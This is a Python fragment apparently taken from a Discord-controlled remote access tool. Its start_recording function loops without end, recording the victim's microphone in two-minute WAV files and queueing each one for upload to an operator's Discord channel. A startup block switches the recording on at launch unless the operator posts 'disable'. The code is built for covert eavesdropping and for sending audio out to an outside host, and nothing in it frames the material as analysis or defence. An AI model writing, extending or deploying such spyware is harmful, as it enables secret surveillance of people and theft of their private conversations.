from scipy.io.wavfile import write
from threading import Thread
from resources.misc import *
import sounddevice
import os
# end of imports

# anywhere
def start_recording():
    global files_to_send, channel_ids
    while True:
        recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
        sounddevice.wait()
        try: os.mkdir('rec_')
        except: pass
        record_name = 'rec_\\' + current_time() + '.wav'
        write(record_name, 16000, recorded_mic)
        files_to_send.append([channel_ids['recordings'], '', record_name, True])

# !recording_startup
recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())
if recording_channel_last_message == None or recording_channel_last_message.content != 'disable':
    Thread(target=start_recording).start()
    await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
else:
    await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete last message on` <#' + str(channel_ids['recordings']) + '>')
